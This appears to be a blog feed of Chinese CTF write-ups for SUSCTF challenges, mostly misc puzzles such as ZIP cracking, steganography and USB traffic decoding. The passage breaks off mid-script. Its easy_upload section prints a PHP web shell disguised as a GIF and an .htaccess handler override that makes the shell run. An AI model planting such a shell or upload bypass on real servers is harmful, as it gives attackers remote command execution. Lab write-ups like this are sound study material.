<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZmxhZ+aYr+S7gOS5iO+8jOWIsOW6leW6lOivpeWmguS9leWunueOsOOAgiDpnZ7mtLLmm77nu4/or7Tov4fvvIzmnIDngbXnuYHnmoTkurrkuZ/nnIvkuI3op4Hoh6rlt7HnmoTog4zohIrjgILov5nkvLzkuY7op6PnrZTkuobmiJHnmoTnlpHmg5HjgIIg5bim552A6L+Z5Lqb6Zeu6aKY77yM5oiR5Lus5p2l5a6h6KeG5LiA5LiLZmxhZ+aYr+S7gOS5iOOAgiDluKbnnYDov5nkupvpl67popjvvIzmiJHku6zmnaXlrqHop4bkuIDkuItmbGFn5piv5LuA5LmI44CCIOeOsOWcqO+8jOino+WGs2ZsYWfmmK/ku4DkuYjnmoTpl67popjvvIzmmK/pnZ7luLjpnZ7luLjph43opoHnmoTjgIIg5omA5Lul77yMIOe7j+i/h+S4iui/sOiuqOiuuu+8jCDml6LnhLblpoLkvZXvvIwg6YKj5LmI77yMIOaAu+e7k+eahOadpeivtO+8jCDnjrDlnKjvvIzop6PlhrNmbGFn5piv5LuA5LmI55qE6Zeu6aKY77yM5piv6Z2e5bi46Z2e5bi46YeN6KaB55qE44CCIOaJgOS7pe+8jCDmnKzkurrkuZ/mmK/nu4/ov4fkuobmt7HmgJ3nhp/omZHvvIzlnKjmr4/kuKrml6Xml6XlpJzlpJzmgJ3ogIPov5nkuKrpl67popjjgIIg5aWl5pmu5ouJwrfmuKnlvJfnkZ7mm77nu4/or7Tov4fvvIzkvaDnm7jkv6Hku4DkuYjvvIzkvaDlsLHmiJDkuLrku4DkuYjmoLfnmoTkurrjgILov5nkvLzkuY7op6PnrZTkuobmiJHnmoTnlpHmg5HjgIIg6ICM6L+Z5Lqb5bm25LiN5piv5a6M5YWo6YeN6KaB77yM5pu05Yqg6YeN6KaB55qE6Zeu6aKY5piv77yMIOiAjOi/meS6m+W5tuS4jeaYr+WujOWFqOmHjeimge+8jOabtOWKoOmHjeimgeeahOmXrumimOaYr++8jCDmiJHku6zkuIDoiKzorqTkuLrvvIzmipPkvY/kuobpl67popjnmoTlhbPplK7vvIzlhbbku5bkuIDliIfliJnkvJrov47liIPogIzop6PjgIIg5omA6LCTZmxhZ+aYr+S7gOS5iO+8jOWFs+mUruaYr2ZsYWfmmK/ku4DkuYjpnIDopoHlpoLkvZXlhpnjgIIg546w5Zyo77yM6Kej5YazZmxhZ+aYr+S7gOS5iOeahOmXrumimO+8jOaYr+mdnuW4uOmdnuW4uOmHjeimgeeahOOAgiDmiYDku6XvvIwg5LiA6Iis5p2l6K6y77yM5oiR5Lus6YO95b+F6aG75Yqh5b+F5oWO6YeN55qE6ICD6JmR6ICD6JmR44CCIGZsYWfmmK/ku4DkuYjvvIzliLDlupXlupTor6XlpoLkvZXlrp7njrDjgIIgZmxhZ+aYr+S7gOS5iO+8jOWIsOW6leW6lOivpeWmguS9leWunueOsOOAgiDlr7nmiJHkuKrkurrogIzoqIDvvIxmbGFn5piv5LuA5LmI5LiN5LuF5LuF5piv5LiA5Liq6YeN5aSn55qE5LqL5Lu277yM6L+Y5Y+v6IO95Lya5pS55Y+Y5oiR55qE5Lq655Sf44CCIOmCo+S5iO+8jCDkuIDoiKzmnaXor7TvvIwg5LuO6L+Z5Liq6KeS5bqm5p2l55yL77yMIOW4puedgOi/meS6m+mXrumimO+8jOaIkeS7rOadpeWuoeinhuS4gOS4i2ZsYWfmmK/ku4DkuYjjgIIg5ZCJ5aeGwrfnvZfmganmm77nu4/or7Tov4fvvIzopoHkuYjkvaDkuLvlrrDnlJ/mtLvvvIzopoHkuYjkvaDooqvnlJ/mtLvkuLvlrrDjgILov5nkuI3npoHku6TmiJHmt7HmgJ3jgIIg6L+Z5qC355yL5p2l77yMIOWhnuWGheWKoOivtOi/h+S4gOWPpeWvjOacieWTsueQhueahOivne+8jOWLh+awlOmAmuW+gOWkqeWggu+8jOaAr+aHpumAmuW+gOWcsOeLseOAgui/meWPpeivneivreiZveeEtuW+iOefre+8jOS9huS7pOaIkea1ruaDs+iBlOe/qeOAgiDlr7nmiJHkuKrkurrogIzoqIDvvIxmbGFn5piv5LuA5LmI5LiN5LuF5LuF5piv5LiA5Liq6YeN5aSn55qE5LqL5Lu277yM6L+Y5Y+v6IO95Lya5pS55Y+Y5oiR55qE5Lq655Sf44CCIOS6huino+a4healmmZsYWfmmK/ku4DkuYjliLDlupXmmK/kuIDnp43mgI7kuYjmoLfnmoTlrZjlnKjvvIzmmK/op6PlhrPkuIDliIfpl67popjnmoTlhbPplK7jgIIg6I6O5aOr5q+U5Lqa6K+06L+H5LiA5Y+l5a+M5pyJ5ZOy55CG55qE6K+d77yM5Lq655qE5LiA55Sf5piv55+t55qE77yM5L2G5aaC5p6c5Y2R5Yqj5Zyw6L+H6L+Z5LiA55Sf77yM5bCx5aSq6ZW/5LqG44CC5oiR5biM5pyb6K+45L2N5Lmf6IO95aW95aW95Zyw5L2T5Lya6L+Z5Y+l6K+d44CCIOWIq+ael+aWr+WfuuivtOi/h+S4gOWPpeWvjOacieWTsueQhueahOivne+8jOWlveeahOS5puexjeaYr+acgOi0temHjeeahOePjeWuneOAgui/meS8vOS5juino+etlOS6huaIkeeahOeWkeaDkeOAgiDmiJHku6zkuI3lvpfkuI3pnaLlr7nkuIDkuKrpnZ7luLjlsLTlsKznmoTkuovlrp7vvIzpgqPlsLHmmK/vvIwg5LuO6L+Z5Liq6KeS5bqm5p2l55yL77yMIGZsYWfmmK/ku4DkuYjvvIzliLDlupXlupTor6XlpoLkvZXlrp7njrDjgIIg5oiR5Lus5LiA6Iis6K6k5Li677yM5oqT5L2P5LqG6Zeu6aKY55qE5YWz6ZSu77yM5YW25LuW5LiA5YiH5YiZ5Lya6L+O5YiD6ICM6Kej44CCIOafpeWwlOaWr8K35Y+y6ICD5Lyv5pu+57uP5o+Q5Yiw6L+H77yM5LiA5Liq5Lq65Yeg5LmO5Y+v5Lul5Zyo5Lu75L2V5LuW5oCA5pyJ5peg6ZmQ54Ot5b+x55qE5LqL5oOF5LiK5oiQ5Yqf44CCIOi/meWQr+WPkeS6huaIke+8jCDljaHogJDln7rmm77nu4/or7Tov4fvvIzmiJHku6zoi6Xlt7LmjqXlj5fmnIDlnY/nmoTvvIzlsLHlho3msqHmnInku4DkuYjmjZ/lpLHjgILluKbnnYDov5nlj6Xor53vvIzmiJHku6zov5jopoHmm7TliqDmhY7ph43nmoTlrqHop4bov5nkuKrpl67popjvvJog6L+Z56eN5LqL5a6e5a+55pys5Lq65p2l6K+05oSP5LmJ6YeN5aSn77yM55u45L+h5a+56L+Z5Liq5LiW55WM5Lmf5piv5pyJ5LiA5a6a5oSP5LmJ55qE44CCIOaJgOiwk2ZsYWfmmK/ku4DkuYjvvIzlhbPplK7mmK9mbGFn5piv5LuA5LmI6ZyA6KaB5aaC5L2V5YaZ44CCIOS4gOiIrOadpeiusu+8jOaIkeS7rOmDveW/hemhu+WKoeW/heaFjumHjeeahOiAg+iZkeiAg+iZkeOAgiDmr4/kuKrkurrpg73kuI3lvpfkuI3pnaLlr7nov5nkupvpl67popjjgIIg5Zyo6Z2i5a+56L+Z56eN6Zeu6aKY5pe277yMIGZsYWfmmK/ku4DkuYjvvIzlj5HnlJ/kuobkvJrlpoLkvZXvvIzkuI3lj5HnlJ/lj4jkvJrlpoLkvZXjgIIg55m95ZOy54m56K+06L+H5LiA5Y+l5a+M5pyJ5ZOy55CG55qE6K+d77yM5Z2a5by655qE5L+h5b+16IO96LWi5b6X5by66ICF55qE5b+D77yM5bm25L2/5LuW5Lus5Y+Y5b6X5pu05Z2a5by644CCIOaIkeW4jOacm+ivuOS9jeS5n+iDveWlveWlveWcsOS9k+S8mui/meWPpeivneOAgmZsYWfmmK9TVVNDVEZ7b2hfVV9nM3RfMXR9CuOAgOOAgOaIkeS7rOmDveefpemBk++8jOWPquimgeacieaEj+S5ie+8jOmCo+S5iOWwseW/hemhu+aFjumHjeiAg+iZkeOAgiDku47ov5nkuKrop5LluqbmnaXnnIvvvIwg6bKB5be06YeR5Zyo5LiN57uP5oSP6Ze06L+Z5qC36K+06L+H77yM6K+75Lmm5piv5Zyo5Yir5Lq65oCd5oOz55qE5biu5Yqp5LiL77yM5bu656uL6LW36Ieq5bex55qE5oCd5oOz44CC6L+Z5LiN56aB5Luk5oiR5rex5oCd44CCIOW4puedgOi/meS6m+mXrumimO+8jOaIkeS7rOadpeWuoeinhuS4gOS4i2ZsYWfmmK/ku4DkuYjjgIIg5oiR5Lus5LiA6Iis6K6k5Li677yM5oqT5L2P5LqG6Zeu6aKY55qE5YWz6ZSu77yM5YW25LuW5LiA5YiH5YiZ5Lya6L+O5YiD6ICM6Kej44CCIOimgeaDs+a4healmu+8jGZsYWfmmK/ku4DkuYjvvIzliLDlupXmmK/kuIDnp43mgI7kuYjmoLfnmoTlrZjlnKjjgIIg576O5Y2O57qz6K+06L+H5LiA5Y+l5a+M5pyJ5ZOy55CG55qE6K+d77yM5Yu/6Zeu5oiQ5Yqf55qE56eY6K+A5Li65L2V77yM5LiU5bC95YWo5Yqb5YGa5L2g5bqU6K+l5YGa55qE5LqL5ZCn44CC5oiR5biM5pyb6K+45L2N5Lmf6IO95aW95aW95Zyw5L2T5Lya6L+Z5Y+l6K+d44CCIOacrOS6uuS5n+aYr+e7j+i/h+S6hua3seaAneeGn+iZke+8jOWcqOavj+S4quaXpeaXpeWknOWknOaAneiAg+i/meS4qumXrumimOOAgg==</span><br></pre></td></tr></table></figure>
<p><code>flag是什么，到底应该如何实现。 非洲曾经说过，最灵繁的人也看不见自己的背脊。这似乎解答了我的疑惑。 带着这些问题，我们来审视一下flag是什么。 带着这些问题，我们来审视一下flag是什么。 现在，解决flag是什么的问题，是非常非常重要的。 所以， 经过上述讨论， 既然如何， 那么， 总结的来说， 现在，解决flag是什么的问题，是非常非常重要的。 所以， 本人也是经过了深思熟虑，在每个日日夜夜思考这个问题。 奥普拉·温弗瑞曾经说过，你相信什么，你就成为什么样的人。这似乎解答了我的疑惑。 而这些并不是完全重要，更加重要的问题是， 而这些并不是完全重要，更加重要的问题是， 我们一般认为，抓住了问题的关键，其他一切则会迎刃而解。 所谓flag是什么，关键是flag是什么需要如何写。 现在，解决flag是什么的问题，是非常非常重要的。 所以， 一般来讲，我们都必须务必慎重的考虑考虑。 flag是什么，到底应该如何实现。 flag是什么，到底应该如何实现。 对我个人而言，flag是什么不仅仅是一个重大的事件，还可能会改变我的人生。 那么， 一般来说， 从这个角度来看， 带着这些问题，我们来审视一下flag是什么。 吉姆·罗恩曾经说过，要么你主宰生活，要么你被生活主宰。这不禁令我深思。 这样看来， 塞内加说过一句富有哲理的话，勇气通往天堂，怯懦通往地狱。这句话语虽然很短，但令我浮想联翩。 对我个人而言，flag是什么不仅仅是一个重大的事件，还可能会改变我的人生。 了解清楚flag是什么到底是一种怎么样的存在，是解决一切问题的关键。 莎士比亚说过一句富有哲理的话，人的一生是短的，但如果卑劣地过这一生，就太长了。我希望诸位也能好好地体会这句话。 别林斯基说过一句富有哲理的话，好的书籍是最贵重的珍宝。这似乎解答了我的疑惑。 我们不得不面对一个非常尴尬的事实，那就是， 从这个角度来看， flag是什么，到底应该如何实现。 我们一般认为，抓住了问题的关键，其他一切则会迎刃而解。 查尔斯·史考伯曾经提到过，一个人几乎可以在任何他怀有无限热忱的事情上成功。 这启发了我， 卡耐基曾经说过，我们若已接受最坏的，就再没有什么损失。带着这句话，我们还要更加慎重的审视这个问题： 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 所谓flag是什么，关键是flag是什么需要如何写。 一般来讲，我们都必须务必慎重的考虑考虑。 每个人都不得不面对这些问题。 在面对这种问题时， flag是什么，发生了会如何，不发生又会如何。 白哲特说过一句富有哲理的话，坚强的信念能赢得强者的心，并使他们变得更坚强。 我希望诸位也能好好地体会这句话。flag是SUSCTF&#123;oh_U_g3t_1t&#125;
　　我们都知道，只要有意义，那么就必须慎重考虑。 从这个角度来看， 鲁巴金在不经意间这样说过，读书是在别人思想的帮助下，建立起自己的思想。这不禁令我深思。 带着这些问题，我们来审视一下flag是什么。 我们一般认为，抓住了问题的关键，其他一切则会迎刃而解。 要想清楚，flag是什么，到底是一种怎么样的存在。 美华纳说过一句富有哲理的话，勿问成功的秘诀为何，且尽全力做你应该做的事吧。我希望诸位也能好好地体会这句话。 本人也是经过了深思熟虑，在每个日日夜夜思考这个问题。</code></p>
<p><code>SUSCTF&#123;oh_U_g3t_1t&#125;</code></p>
<h4 id="Web-EasyRobot"><a href="#Web-EasyRobot" class="headerlink" title="[Web]EasyRobot"></a>[Web]EasyRobot</h4><p><img src="/2021/11/01/Hulu-WP/image-20211030143506995.png" alt="image-20211030143506995"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211030143451182.png" alt="image-20211030143451182"></p>
<h4 id="Web-easy-upload"><a href="#Web-easy-upload" class="headerlink" title="[Web]easy_upload"></a>[Web]easy_upload</h4><p>上传图片马test01.jpg</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传<code>.htaccess.jpg</code>然后用BP修改文件类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test01&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>配置议剑</p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031180047644.png" alt="image-20211031180047644"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031180029022.png" alt="image-20211031180029022"></p>
<p><img src="/2021/11/01/Hulu-WP/image-20211031180020041.png" alt="image-20211031180020041"></p>
<p><code>SUSCTF&#123;86a70a308a459e0beea551aa91cf54d8&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2020</title>
    <url>/2020/10/20/SUS2020/</url>
    <content><![CDATA[<h4 id="分数-3287"><a href="#分数-3287" class="headerlink" title="分数 3287"></a>分数 3287</h4><h4 id="排名-15"><a href="#排名-15" class="headerlink" title="排名 15"></a>排名 15</h4><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="[Misc]签到"></a>[Misc]签到</h4><p>SUSCTF{Welcome_t0_SUSCTF}</p>
<h4 id="Misc-爆破鬼才请求出战"><a href="#Misc-爆破鬼才请求出战" class="headerlink" title="[Misc]爆破鬼才请求出战"></a>[Misc]爆破鬼才请求出战</h4><h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>打开会有提示<code>m?s?_?tt4?k!</code><br><img src="/2020/10/20/SUS2020/baopo.png" alt>  </li>
<li>利用ARCHPR掩码攻击获取密码<br><img src="/2020/10/20/SUS2020/掩码攻击.png" alt><br><code>m4sk_att4Ck!</code>  </li>
<li><p>解压得到LSB.png，利用StegSolve提取隐写数据，保存成文本，得到<br><code>S&#123;urgdt1&#125;UY_30__sS0a_04mc</code>  </p>
</li>
<li><p>栅栏密码，每组3字<br><code>SUS&#123;Y0u_ar3_g00d_4t_m1sc&#125;</code></p>
</li>
</ol>
<h4 id="Misc-签到之公众号"><a href="#Misc-签到之公众号" class="headerlink" title="[Misc]签到之公众号"></a>[Misc]签到之公众号</h4><p>关注公众号，回复flag<br><code>SUSCTF&#123;W3lc0m3_t0_SUSCTF&#125;</code></p>
<h4 id="Misc-Dance-Dance"><a href="#Misc-Dance-Dance" class="headerlink" title="[Misc]Dance_Dance"></a>[Misc]Dance_Dance</h4><h5 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>图片<br><img src="/2020/10/20/SUS2020/The_dancing_men.png" alt>  </p>
</li>
<li><p>利用<a href="https://www.dcode.fr/dancing-men-cipher解密得到">https://www.dcode.fr/dancing-men-cipher解密得到</a>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pa sswdL etU  </span><br><span class="line">sdanCe</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据提示“让我们跟着音乐起舞吧！”，使用<code>binwalk</code>查看是否内含文件，发现zip，故<code>dd if=The_dancing_men.png of=f.zip skip=48243 bs=1</code>将压缩包分离出来  </p>
</li>
<li>解压发现需要密码，正是<code>LetUsdanCe</code>  </li>
<li>得到音频文件Do_u_know_spectrum.wav，用Audacity打开，并查看频谱图有：<br><img src="/2020/10/20/SUS2020/spec.png" alt>  </li>
<li>扫描二维码得<br><code>SUS&#123;1nt3r35t1nG_5p3ctRum&#125;</code></li>
</ol>
<h4 id="Misc-balɟ¯ʇuᴉɹԀ"><a href="#Misc-balɟ¯ʇuᴉɹԀ" class="headerlink" title="[Misc]ƃɐlɟ¯ʇuᴉɹԀ"></a>[Misc]ƃɐlɟ¯ʇuᴉɹԀ</h4><h5 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用010Editor查看发现尾部有类似zip文件头的标志，但整个字节流是倒序的，故利用Python顺过来  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\ti_nepo_ot_woh&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> m:</span><br><span class="line">    m.write(binascii.b2a_hex(f))</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\sus.zip&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(tmp[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Download\\result.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> result:</span><br><span class="line">    result.write(binascii.a2b_hex(tmp[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<ol>
<li><p>得到一个可以正常解压缩的zip文件result.zip，解压缩得到here_are_some_codes.zip和use_zipin_to_get_password.txt，后者中有以下文本  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyud0ko3aMDa1MttNDoaaunr0NtMtw:moy3aryoimi:uu:0m01aiypiuDaMmukaNrNM?M:M:mnnnt1rmDp?001Nanow:u?kN:0ykkyaMDkyMuDNMpuaNDykNm:NmmMMk1pki0idodmanMimupwwDooiy:i:kodmMOOa?k1witMk:aukiiM:iakDmni3w3?mwioiDooM:wiMrm:m0ooO:OokNMykNNwimOak0ddmopOmymuNo1aM0Mdt1?1Domynmnmw:0:o:uD30mDDyi:Dppi3a0Nmi:yOr??OOkdwwip3wr0u3aw1Mw:irrmtpkMd0n0kyD:3y:odnMDuiDNyaNMpyNykm:puw0?:DNrMoMkMDk3Nk03wtiO0mpoyidymtdiiD3O3Oa1yin?o3wDm3:mamduayD0:?iur?uwn:N001uioDa3Dumd3kukmdadmOaodn:iioy:nimnauu31nk0tda?rpoi1i1ioMOmi0MyyMktmNM::mOi3oMyMwMopoMtMu?ka:nmM3D:NyydpuymN1pO0mwoymraDiymMOd:pODuMmy0nDOMO0id3:ydDdrkNi0yoD1imOoDm0kinwyMi?MONm0Nyood:ONDdi:oyw0OM1:?:w?pitkOoa0:dtraiurNyyrN3uw1uwMyDtp10Ma:MMo:moMirupDmioOadOitwDt:yy0D:i3Na:naoMatra1uMrNwndiku3m?mOuda:OM1wnyourkau1dDw:oM:1myoNNDkk:ka3p?rywDwiakDa3d:i0Mo3a3M3aMkry0ionkmO3:?waO:MM0MNNymar3pmudwompwuoo0mOOyDNak1aDiow13yr?mNikw?royu?p1Dkm1k:DDmktty1rrMp?yw3y3kmtpyd:maiwDN0nDOMMkDdy:watMkidu:D:Mi0w00aN:ku:1:a:npaNOD:MpwODaiaDu:dMoaDmayOmwwMtw:0DuM3u?:po0iN:adrt0up?ONiND?nNmtDdronmaOMinm0:miMDyddMpk?doMdi0pNOyoMMuiwt0m3at0uDuid0Nm0iiyi:uOONdiOr3tMpn:kri3kpomioMDmN1Oadaai3Mmwa10OrwriiON:0:uuiDkD?r:iynuMui0yiarMy:O:yMp?mdkDDo33ay:pMnanNDo3nkoiOapt:1MNkr0Di?0mkr0yy:NauatDao0aim0w3i:Op0aikwDmmuoimnyr:Nuo:p3no0yy3apauDua0w0mo0u?3Nup?mo:3NMDwNDtudyi3D:d1DmNaykn1MOMwo?OMpodna1D0:wm0kiDrr?o?ppuwu:tNykDpkpNttnunurd11ptwamrnm3k0a:i1pOpu0mMtua331Ou3OMaONkMaDrMptDO30yDrd1duooOuNODkNkNmi1N0MMiOadmymNnOkwM0MMDkMMMraa1dtwuoDd0a:wkm300O0ymD1w13:oDNayw0i0a0My130Oim0?0urro3OOMp3ukDaiiymnr</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">字频统计</a>发现,，按频率从高到底有：  <code>Mima:D0youkNOw3dpr1nt?</code>  </p>
</li>
<li><p>解压成功，获得sus文件，内有G代码，拿到<a href="http://nraynaud.github.io/webgcode">http://nraynaud.github.io/webgcode</a> 执行，Front面有flag，多找两个面放大即可看到被挡住的字符了<br><img src="/2020/10/20/SUS2020/3D.png" alt><br><code>SUS&#123;3D_Pr1nting_1s_Great&#125;</code>  </p>
</li>
</ol>
<h4 id="Misc-抓住那只小老鼠"><a href="#Misc-抓住那只小老鼠" class="headerlink" title="[Misc]抓住那只小老鼠"></a>[Misc]抓住那只小老鼠</h4><h5 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p>用010Editor查看文件，发现尾部有提示：<br><code>D0 y0u Kn0wPseudo encryption?</code></p>
</li>
<li><p>故为zip伪加密，找到504b0102后加密标志位（除了里面包含的一个zip文件外）改为0000，可正常解压，得到keyboard.pcapng和这个小老鼠竟然是个右撇子.zip  </p>
</li>
<li>得到的zip仍为加密的，猜测密码应在keyboard.pcapng中  </li>
<li><a href="https://blog.csdn.net/qq_36609913/article/details/78578406">参考1</a><br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">参考2</a><br>从键盘流量中获取信息并导出到usbdata.txt：<code>tshark -r keyboard.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure>
<p><code>PASSWORD  L3T-U5-L00K-4T-TH3-R1GHT-BUTT0N</code><br>实际上应该为小写。。。。l3t-u5-l00k-4t-th3-r1ght-butt0n</p>
<ol>
<li>通过以上密码可直接解压第二个zip，分析mouse.pcapng数据，<code>tshark -r mouse.pcapng -T fields -e usb.capdata &gt; mousedata.txt</code>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;mousedata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span 